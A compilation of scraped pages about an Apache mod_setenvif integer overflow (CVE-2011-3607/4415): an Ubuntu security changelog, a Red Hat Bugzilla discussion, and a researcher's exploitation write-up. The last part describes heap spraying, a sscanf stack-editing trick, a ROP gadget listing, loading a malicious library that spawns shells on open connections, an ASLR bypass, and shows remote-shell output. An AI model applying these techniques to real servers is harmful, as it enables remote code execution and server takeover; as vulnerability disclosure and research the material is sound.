![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Launchpad Janitor (janitor)](https://launchpad.net/~janitor) wrote on 2012-02-16: |  |  | [#13](/ubuntu/%2Bsource/apache2/%2Bbug/811422/comments/13) |
| --- | --- | --- | --- |

This bug was fixed in the package apache2 - 2.2.8-1ubuntu0.23

---------------

apache2 (2.2.8-1ubuntu0.23) hardy-security; urgency=low

\* SECURITY UPDATE: arbitrary code execution via crafted SetEnvIf

    directive (LP: [#811422](/bugs/811422))

    - debian/patches/220\_CVE-2011-3607.dpatch: validate length in

      server/util.c.

    - CVE-2011-3607

  \* SECURITY UPDATE: another mod\_proxy reverse proxy exposure

    - debian/patches/221\_CVE-2011-4317.dpatch: validate additional URIs in

      modules/mappers/mod\_rewrite.c, modules/proxy/mod\_proxy.c,

      server/protocol.c.

    - CVE-2011-4317

  \* SECURITY UPDATE: denial of service and possible code execution via

    type field modification within a scoreboard shared memory segment

    - debian/patches/222\_CVE-2012-0031.dpatch: check type field in

      server/scoreboard.c.

    - CVE-2012-0031

  \* SECURITY UPDATE: cookie disclosure via Bad Request errors

    - debian/patches/223\_CVE-2012-0053.dpatch: check lengths in

      server/protocol.c.

    - CVE-2012-0053

 -- Marc Deslauriers <email address hidden> Tue, 14 Feb 2012 10:49:11 -0500

This bug was fixed in the package apache2 - 2.2.8-1ubuntu0.23
---------------
apache2 (2.2.8-1ubuntu0.23) hardy-security; urgency=low
\* SECURITY UPDATE: arbitrary code execution via crafted SetEnvIf
directive (LP: #811422)
- debian/patches/220\_CVE-2011-3607.dpatch: validate length in
server/util.c.
- CVE-2011-3607
\* SECURITY UPDATE: another mod\_proxy reverse proxy exposure
- debian/patches/221\_CVE-2011-4317.dpatch: validate additional URIs in
modules/mappers/mod\_rewrite.c, modules/proxy/mod\_proxy.c,
server/protocol.c.
- CVE-2011-4317
\* SECURITY UPDATE: denial of service and possible code execution via
type field modification within a scoreboard shared memory segment
- debian/patches/222\_CVE-2012-0031.dpatch: check type field in
server/scoreboard.c.
- CVE-2012-0031
\* SECURITY UPDATE: cookie disclosure via Bad Request errors
- debian/patches/223\_CVE-2012-0053.dpatch: check lengths in
server/protocol.c.
- CVE-2012-0053
-- Marc Deslauriers <marc.deslauriers@ubuntu.com> Tue, 14 Feb 2012 10:49:11 -0500

| Changed in apache2 (Ubuntu Hardy): | |
| --- | --- |
| **status**: | Confirmed → Fix Released |
| Changed in apache2 (Ubuntu Lucid): | |
| **status**: | Confirmed → Fix Released |
| Changed in apache2 (Ubuntu Maverick): | |
| **status**: | Confirmed → Fix Released |
| Changed in apache2 (Ubuntu Natty): | |
| **status**: | Confirmed → Fix Released |
| Changed in apache2 (Ubuntu Oneiric): | |
| **status**: | Confirmed → Fix Released |

[See full activity log](https://bugs.launchpad.net/ubuntu/%2Bsource/apache2/%2Bbug/811422/%2Bactivity)

To post a comment you must [log in](%2Blogin?comments=all).

* [Report a bug](/ubuntu/%2Bsource/apache2/%2Bfilebug)

This report contains
**Public Security**
information

Everyone can see this security related information.

You are
[not directly subscribed to this bug's notifications.](/ubuntu/%2Bsource/apache2/%2Bbug/811422/%2Bsubscribe)

Subscribing...

* [Edit bug mail](https://bugs.launchpad.net/ubuntu/%2Bsource/apache2/%2Bbug/811422/%2Bsubscriptions "View and change your subscriptions to this bug")

## Other bug subscribers

[Subscribe someone else](https://bugs.launchpad.net/ubuntu/%2Bsource/apache2/%2Bbug/811422/%2Baddsubscriber "Launchpad will email that person whenever this bugs changes")

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from bugzilla.redhat.com_7d224756_20250126_073922.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D750935)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D750935)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D750935)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 750935

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 750935**](show_bug.cgi?id=750935)
(CVE-2011-4415)
- [CVE-2011-4415](https://access.redhat.com/security/cve/CVE-2011-4415) httpd: SetEnvIf resource exhaustion

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2011-4415 httpd: SetEnvIf resource exhaustion

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED WONTFIX | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2011-4415 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | low | | [Severity:](page.cgi?id=fields.html#bug_severity) | low | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [750936](show_bug.cgi?id=750936) | | TreeView+ | [depends on](buglist.cgi?bug_id=750935&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=750935&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2011-11-02 21:14 UTC by Vincent Danen | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-02-24 13:48 UTC ([History](show_activity.cgi?id=750935)) | | [CC List:](page.cgi?id=fields.html#cclist) | 9 users (show)  jkaluza jlieskov jorton mjc pahan pcheung prc rcvalle wnefal+redhatbugzilla | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2011-12-22 14:44:09 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=750935#c0)  Vincent Danen    2011-11-02 21:14:55 UTC  ``` It was reported [1] that an integer overflow was found in Apache in the ap_pregsub() function called from mod-setenvif.  When a header field is mangled using SetEnvIf, the new environment variable data can be multiples of the size of the submitted header field.  This would cause ap_pregsub() to overflow the length value in buffer size calculations, leading to the subsequent allocation call of a too-small buffer.  Filling this buffer with user-supplied data will lead to a buffer overflow.  Depending on the input data, this can lead to excessive allocation of server memory (resulting in killed processes due to out-of-memory conditions), invalid memory access when copying large amounts of data (which can lead to a termination of the httpd process), or possibly allowing the execution of arbitrary code.  To trigger this flaw, mod_setenvif must be enabled (the default) and the attacker needs to be able to place a crafted .htaccess file on the server (which, in most cases, would require local access to the file system or some web interface that allows for writing arbitrary files to the local file system, such as for custom .htaccess files).  There is currently no upstream fix, however to work around the problem, disable mod_setenvif.  [1] <http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/>   ```  [Comment 1](show_bug.cgi?id=750935#c1)  Vincent Danen    2011-11-02 21:19:47 UTC  ``` Created httpd tracking bugs for this issue  Affects: fedora-all [[bug 750937](show_bug.cgi?id=750937 "CLOSED DUPLICATE - CVE-2011-3607 httpd: ap_pregsub Integer overflow to buffer overflow [fedora-all]")]   ```  [Comment 3](show_bug.cgi?id=750935#c3)  Vincent Danen    2011-11-08 15:24:19 UTC  ``` MITRE has assigned an additional CVE to this issue ([CVE-2011-4415](https://access.redhat.com/security/cve/CVE-2011-4415)), the description of both CVEs are as follows:   Common Vulnerabilities and Exposures assigned an identifier [CVE-2011-3607](https://access.redhat.com/security/cve/CVE-2011-3607) to the following vulnerability:  Name: [CVE-2011-3607](https://access.redhat.com/security/cve/CVE-2011-3607) URL: <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3607> Assigned: 20110921 Reference: <http://archives.neohapsis.com/archives/fulldisclosure/2011-11/0023.html> Reference: <http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/> Reference: <http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/DemoExploit.html> Reference: [https://bugs.launchpad.net/ubuntu/+source/apache2/+bug/811422](https://bugs.launchpad.net/ubuntu/%2Bsource/apache2/%2Bbug/811422) Reference: [https://bugzilla.redhat.com/show_bug.cgi?id=750935](show_bug.cgi?id=750935 "CLOSED WONTFIX - CVE-2011-4415 httpd: SetEnvIf resource exhaustion") Reference: <http://www.securityfocus.com/bid/50494> Reference: <http://www.osvdb.org/76744> Reference: <http://securitytracker.com/id?1026267> Reference: <http://secunia.com/advisories/45793> Reference: <http://xforce.iss.net/xforce/xfdb/71093>  Integer overflow in the ap_pregsub function in server/util.c in the Apache HTTP Server 2.0.x through 2.0.64 and 2.2.x through 2.2.21, when the mod_setenvif module is enabled, allows local users to gain privileges via a .htaccess file with a crafted SetEnvIf directive, in conjunction with a crafted HTTP request header, leading to a heap-based buffer overflow.   Common Vulnerabilities and Exposures assigned an identifier [CVE-2011-4415](https://access.redhat.com/security/cve/CVE-2011-4415) to the following vulnerability:  Name: [CVE-2011-4415](https://access.redhat.com/security/cve/CVE-2011-4415) URL: <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-4415> Assigned: 20111108 Reference: <http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/> Reference: <http://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/DemoExploit.html> Reference: <http://www.gossamer-threads.com/lists/apache/dev/403775>  The ap_pregsub function in server/util.c in the Apache HTTP Server 2.0.x through 2.0.64 and 2.2.x through 2.2.21, when the mod_setenvif module is enabled, does not restrict the size of values of environment variables, which allows local users to cause a denial of service (memory consumption or NULL pointer dereference) via a .htaccess file with a crafted SetEnvIf directive, in conjunction with a crafted HTTP request header, related to (1) the "len +=" statement and (2) the apr_pcalloc function call, a different vulnerability than [CVE-2011-3607](https://access.redhat.com/security/cve/CVE-2011-3607).   ```  [Comment 4](show_bug.cgi?id=750935#c4)  Tomas Hoger    2011-11-08 15:33:00 UTC  ``` Upstream fix adding check for integer overflow:   <http://svn.apache.org/viewvc?view=revision&revision=1198940>  It does not add any protection against memory consumption / [CVE-2011-4415](https://access.redhat.com/security/cve/CVE-2011-4415) issue.   ```  [Comment 6](show_bug.cgi?id=750935#c6)  Tomas Hoger    2011-12-01 13:25:36 UTC  ``` (In reply to [comment #4](show_bug.cgi?id=750935#c4)) > Upstream fix adding check for integer overflow: >   <http://svn.apache.org/viewvc?view=revision&revision=1198940>  This fix is only for trunk and is not applicable to 2.2.x and older httpd versions without further changes.  It's currently unclear if the fix is going to be backported to older httpd branches:   <http://thread.gmane.org/gmane.comp.apache.devel/46260>  > It does not add any protection against memory consumption / [CVE-2011-4415](https://access.redhat.com/security/cve/CVE-2011-4415) > issue.  Upstream discussion on whether resource consumption issues triggered by bad .htaccess configuration should (or can) be handled as security or not:   <http://thread.gmane.org/gmane.comp.apache.devel/46339>   ```  [Comment 7](show_bug.cgi?id=750935#c7)  Tomas Hoger    2011-12-21 12:53:26 UTC  ``` (In reply to [comment #6](show_bug.cgi?id=750935#c6)) > > It does not add any protection against memory consumption / [CVE-2011-4415](https://access.redhat.com/security/cve/CVE-2011-4415) > > issue. >  > Upstream discussion on whether resource consumption issues triggered by bad > .htaccess configuration should (or can) be handled as security or not: >   <http://thread.gmane.org/gmane.comp.apache.devel/46339>  Upstream consensus is that any resource consumption issues triggered by bad .htaccess configuration are not considered security:   [http://thread.gmane.org/gmane.comp.apache.devel/46339/focus=46768](http://thread.gmane.org/gmane.comp.apache.devel/46339/focus%3D46768)   ```  [Comment 9](show_bug.cgi?id=750935#c9)  Tomas Hoger    2012-01-12 10:32:50 UTC  ``` [CVE-2011-3607](https://access.redhat.com/security/cve/CVE-2011-3607) was split to a separate [bug #769844](show_bug.cgi?id=769844 "CLOSED ERRATA - CVE-2011-3607 httpd: ap_pregsub Integer overflow to buffer overflow").   ```  [Comment 18](show_bug.cgi?id=750935#c18)  Vincent Danen    2012-01-27 20:43:19 UTC  ``` The upstream security team does not consider this to be a flaw:  [http://thread.gmane.org/gmane.comp.apache.devel/46339/focus=46783](http://thread.gmane.org/gmane.comp.apache.devel/46339/focus%3D46783)  Statement:  The ASF Security Team does not consider resource exhaustion caused by .htaccess files to be a security defect.  The Red Hat Security Response Team agrees with their assessment and so does not consider this to be a security flaw.   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=750935&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from www.halfdog.net_a3efd956_20250125_085123.html ===

[www.halfdog.net](/) /
[Security](/Security/) /
[2011](/Security/2011/) /
[ApacheModSetEnvIfIntegerOverflow](/Security/2011/ApacheModSetEnvIfIntegerOverflow) / DemoExploit.html

Share via
[f](https://www.facebook.com/sharer.php?u=https%3A%2F%2Fwww.halfdog.net%2FSecurity/%2FApacheModSetEnvIfIntegerOverflow%2FDemoExploit.html&t=Apache%20modSetEnvIf%20Integer%20Overflow%20Exploitation%20Demo "facebook")
[g+](https://plus.google.com/share?url=https://www.halfdog.net/Security/2011/ApacheModSetEnvIfIntegerOverflow/DemoExploit.html "google+")
# Starting Point

During routine testing, an integer overflow in apache2-mpm-worker 2.2.19
mod-setenvif was found. The crash occured when mangling request
headers using a crafted [.htaccess](SingleThread-htaccess)-file.
The broken code was ap\_pregsub in server/util.c, where the buffer
size of a new header field could overflow, the value was then used
for memory allocation. When copying data to the buffer an, overwrite
of the an apr (apache portable runtime) memory-pool boundaries
occured, similar to standard heap buffer overflows.

# Outline of Exploit

The main goals creating the exploit were:

* Exploit has to be triggerable via HTTP GET requests only
* Exploit data has to be 0-byte free to have valid HTTP-protocol
* No alternative way of heap-spraying is used, e.g. GET + content-length.
  All variants I knew of had much too low efficiency
* Use libc for ROP, although all libc-addresses start with 0-byte,
  which cannot be sent via HTTP
* Rely only on libc address guess, but not heap/stack address guess,
  unless guess could be made nearly 100% reliable
* Use the already open HTTP-connections and turn them into command
  connections on the fly
* Have exploit in less than 256 bytes

Two different exploit layouts were developed. The
[first one](#ExploitationAttempt1) used multiple
threads, so that one was overwriting the data of the second
thread before hitting the end of the memory area. Precise
timing was essential to get shell access.

The [second one](#ExploitationAttempt2) used a
more crafted substitution expression, stopping the copy in
a single thread by modifying the regular expression currently
processed in the thread. Since there is race condition involved,
this exploit was far more reliable than the first one.

# First Exploitation Attempt

Due to the afore-mentioned requirements, an exploit with about
30% success rate for apache2-mpm-worker 2.2.19 on ubuntu oneiric 32bit
was developed with the purpose to learn alternative programming
techniques in a hands-on approach. To get hold of crucial apache
data structures, the programs outlined here tried to exploit
concurrent access to already corrupted data structures before
the otherwise inevitable apache crash. Due to the additional

## Step 0:

Create an [.htaccess](3Thread-htaccess)-file
that will copy more than 4GB of data into a 16MB buffer. Usually
ap\_pregsub will copy data to the buffer, overwriting the whole
apr-pool memory until copy hits the upper mapped memory boundary
(see second while-loop in ap\_pregsub from server/util.c). Since
the .htaccess will cause ap\_pregsub to fill the whole heap with
repeating copies of the HTTP-header block, this will also circumvent
the heap randomization. The heap data will span such a large
portion of heap, so that a pointer to heap will always hit one
of the copies.

## Step 1:

To get a chance to execute code, ap\_pregsub
copy process has to be stopped without SEGV. Two ways are possible:

* The copy process also overwrites the regular expression, that
  is defining which data is currently copied. By overwriting the
  expression with a stop sequence ($9$9..), execution will leave
  ap\_pregsub function without SEGV, but will continue using the
  corrupted heap. Since there is no function pointer call near,
  most of the execution branches will lead to crash. Just one
  path allows to construct an endless loop loop in apr\_palloc.
* Terminate the overwriting process before it reaches the
  end using another apache thread and the already corrupted heap.
  Since data copy is quite fast, the race between the two apache
  threads is very hard to make.

To extend the window of opportunity, an ap\_pregsub-stop
sequence is sent first using <SendTrigger-SingleThreadAprPallocEndlessLoop.c>.
This will add a 16MB race buffer, slow down the server by sending
one thread into endless loop, both helps to extend the race window
in step 3 to 100ms on a 800MHz CPU, which would also be sufficient
for remote TCP exploitation.

## Step 2:

Send traffic, that will make apache use one
function pointer more frequently. For reproducibility it was
important, to send data, that will make apache loop just over
a very limited part of the whole apache binary code. Otherwise
a wide variety of crashes at different code positions were
observed. The <RequestFlood.c>
program will open multiple connections to apache, send
*GET /AAA* and then continue to send *AAAA* every
100ms, thus making the URL data on server side longer in
each iteration. Due to the long time between the sending
of GET header bytes, it is quite likely, that the heap
is overwritten by thread started in step 3 while the current
thread is in apr\_socket\_timeout\_set (srclib/apr/network\_io/unix/sockopt.c).
apr\_socket\_timeout\_set has also one other advantage, it
will pick up the *sock* pointer from corrupted heap
and write the timeout value to that location, thus giving
the opportunity to write the first MSB 0-byte and using
that value as function pointer later on in ap\_get\_brigade
from server/util\_filter.c. The RequestFlood program has
to be running before sending the remote shell trigger in
step 3.

## Step 3:

Send a trigger request, that will overwrite
the apr-heap, similar to the request from step 1, but without
any stop sequence. The HTTP request data will be overwrite the
heap, thus the threads from step 2 can pick it up. This request
contains also the remote shell code, but there are a few obstacles
blocking code execution:

* Stack is not overwritten at all, so standard ROP cannot work
* Heap is overwritten with 0-byte free data, but ROP usually
  needs quite a few 0-bytes. This makes it impossible to use any
  *test xxx; jz yyyy;* branches or use small positive array
  indices.
* Heap is not executable

Workarounds for these problems are collected in
<SendTrigger-RemoteShell.c>:

* **No stack control:** Jump to sscanf in a way, so that
  sscanf will overwrite some values on stack, including a return
  address. This is made easier since sscanf has an integer overflow
  when parsing the offsets for argument skipping syntax. Hence
  it is possible, to access values above and below the current
  stack position using offsets near 2^30, as seen in the scan
  string *%1073741815$32c%3s%4hx%1x%1x%1073741815$7s*.
  sscanf was used to add some 0-bytes on heap also.
* **No full stack control:** sscanf stack editing is painful
  and eats up a lot of payload space. So use the return address
  to jump to *pop esp; ret* to have stack pointing to heap.
* **Non-executable heap:** Jump to mprotect and make heap
  executable
* **Avoid back-connect:** Loop over open file descriptors
  and fork a shell for every descriptor. See
  <ForkPayload.c> for assembly code.
  The code uses the return address from mprotect to calculate
  dup2, fork, execv addresses, thus avoiding need for some more
  0-bytes. The whole remote shell loop code is just 93 bytes.

The trigger program takes the libc start address as argument.
If it is possible to place a symbolic link to /proc/self/maps
on the host, simple renaming of the link will defeat the
NoFollowSymlinks options and allow to read the offsets from
/proc/self/maps, thus defeating the ASLR (
[more](../ApacheNoFollowSymlinkTimerace/)). If not
known, address has to be guessed using different values in
*SendTrigger-RemoteShell --LibcMapPos 0xxxxxx*.

## Step 4:

To reduce the code size, the remote command
connection does not return stdout. To get stdout, the first
command sent to remote should be *exec 1>&0*.
Since <SendTrigger-RemoteShell.c>
does not implement a nice shell gui, one can also telnet
to apache before starting step 3, the telnet connection
will turn to remote shell connection while open.

# Second Exploitation Attempt

In contrast to the first attempt, this exploit overwrites the
currently interpreted regex with a crafted stop sequence to terminate
buffer overwriting before reaching the upper heap limit. In contrast
to the first attempt, this program requires only a single apache
thread to give remote shell and could also be used to take over
process on non-mpm-worker apache servers. Steps:

## Step 0:

Create an
[.htaccess](SingleThread-htaccess)-file in /var/www,
that will copy more than 4GB of data into a 16MB buffer. The
new variable value expression is designed in such way, that when
apache is copying data to the destination buffer and overwriting
the variable definition data itself, the new definition corresponds
to a variable size of zero. Hence the buffer-overflowing copy process
is stopped as soon as the variable definition data is overwritten.

## Step 1:

Mix up heap data to get a layout favorable to
our tasks. This can be done by just sending a normal GET request
for an existing file via a Keep-Alive connection and using that
connection to send the trigger afterwards.

## Step 2:

The most stable server code/data flow leading
to successful exploitation would be one using a function pointer
near to the point where the overflow begun. Otherwise the exploit
code will depend also on other modules loaded or platform configuration
parameters (the first attempt used a function pointer after mod\_setenvif
processing was completed). To archive that, apr\_table\_setn is used.
The function usually would store the new variable value to a
hash-table. Since it is operating on an overwritten table data
structure, it can be used to create 0-bytes at appropriate locations
and finally trigger an invalid allocation. Thus is leading to
apr\_palloc to call an abort-function and this function pointer
can be controlled.

At the moment of this function call, only the function destination
can be controlled, the content of all other registers cannot be
used to call a suitable target function directly. Since the stack
was not overwritten, standard ROP methods do not work. As a workaround,
a part of the \_IO\_file\_seekoff function can be used:

0x00736ff7 <\_IO\_file\_seekoff+407>: mov 0x8(%ebp),%ecx
0x00736ffa <\_IO\_file\_seekoff+410>: mov 0x14(%ebp),%edx
0x00736ffd <\_IO\_file\_seekoff+413>: mov 0x4c(%ecx),%eax
0x00737000 <\_IO\_file\_seekoff+416>: mov %esi,0x4(%esp)
0x00737004 <\_IO\_file\_seekoff+420>: mov %edx,0xc(%esp)
0x00737008 <\_IO\_file\_seekoff+424>: mov %edi,0x8(%esp)
0x0073700c <\_IO\_file\_seekoff+428>: mov %ecx,(%esp)
0x0073700f <\_IO\_file\_seekoff+431>: call \*0x40(%eax)

At the end of the sequence the stack will contain one
pointer of our choice, the value 1 and the call will go to
a controllable destination. That stack layout matches the
function call of \_\_libc\_dlopen\_mode, the internal symbol for
dlload(). A sample program to archive this is
<TriggerRemoteShell.c>.

## Step 3:

Since the attack assumed, that an attacker could
place an .htaccess file on the server, it is also sensible to
assume, that he could put a second file there also. This second
file should be a shared library loaded by the dlload call. The
library contains the *\_init* symbol, this function is called
during loading of the library, hence activating the exploit code.
The library itself is not very special, it just tries to identify
all open socket connections using a *getsockopts* call and
forks a shell for every connection, e.g.
<ExploitLib.c>. When the library is loaded,
the open connection of TriggerRemoteShell.c is turned to a remote
shell. Since apache server on ubuntu oneiric uses ASLR and the
exploit needs the correct libc memory locations, the
TriggerRemoteShell program can be started with the correct libc
mapping information for testing. In real world examples, one
might guess or try to get access to the /proc/[pid]/maps file
before sending the exploit using an
[apache symlink timerace](../ApacheNoFollowSymlinkTimerace/).

buildhost-ubuntuoneiric1110:~$ ./TriggerRemoteShell --LibcMapPos 0x6e5000
Using libc map pos at 0x6e5000
Opening ...
HTTP/1.1 200 OK
Date: Thu, 22 Dec 2011 08:56:36 GMT
Server: Apache/2.2.20 (Ubuntu)
Last-Modified: Sun, 20 Nov 2011 22:55:18 GMT
ETag: "1b76-4-4b23276d097f8"
Accept-Ranges: bytes
Content-Length: 4
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/plain
AAAA
Linux buildhost-ubuntuoneiric1110 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686 athlon i386 GNU/Linux
/usr/sbin/apache2 -k start: Completed: not found
sh: turning off NDELAY mode
ls
bin
boot
dev
...

With a different payload library, the lower-privileged www-data
process can modify the shared memory scoreboard data in a way to
trigger an invalid free/gcc-lib load in the root-priv master process,
see [ApacheScoreboardInvalidFreeOnShutdown](../ApacheScoreboardInvalidFreeOnShutdown/).

# Thinking About Security

Due to my limited programming skills, getting this first and
far-from-good POC exploit was not quite easy. Some apache, libc,
linux software design decisions made it simpler or easier for me:

* apache: Common use of function pointers in apache. Function pointers
  allow implementation of apache as a flexible, modularized web
  server, but simplify arbitrary code execution.
* apache: Parts of the apache code have no checks on reasonable sizes or
  return values, hence allowing abnormally large data structures, e.g.
  for heap spraying or to cause resource starvation.
* apache: apr\_palloc is quite fast but uses very simple data
  structure. Once one *apr\_memnode\_t* structure is under
  control, apr\_palloc can be used to introduce 0-bytes when
  first\_avail is incremented by a known value, which was the
  only other way besides apr\_socket\_timeout\_set to add 0-bytes
* All lib-addresses start with 0-byte: The whole POC would
  be much smaller, if library addresses did not contain 0-bytes.
  This advantage is only relevant for small applications, where
  all libraries and modules fit into the lower 16MB
* libc: sscanf accepts negative arg pointer offsets in arg
  skipping syntax, thus allowing to use stack addresses before
  and after current stack position. What is that feature good for?
* linux: No stack-start randomization on byte granularity,
  allowing sscanf stack editing by modifying only the lowest
  byte of an address
* linux: mprotect syscall does not force unused protection mode
  flag bits to be 0, making it quite possible, that during ROP
  a stack value has the right bits set (x executable).

Last modified 20171228
Contact e-mail: me (%) halfdog.net



=== Content from bugzilla.novell.com_b7edffc6_20250126_073921.html ===



